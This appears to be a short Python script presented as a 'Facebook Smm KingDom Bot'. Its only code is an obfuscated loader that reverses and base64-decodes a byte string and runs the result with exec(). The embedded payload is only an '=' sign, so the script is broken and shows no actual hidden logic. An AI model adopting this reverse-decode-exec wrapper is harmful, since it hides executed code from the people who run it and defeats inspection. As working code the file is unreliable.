# Fares Alex
# Facebook Smm KingDom Bot
# Time: Fri Aug 22 12:38:50 2025
# ----------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))
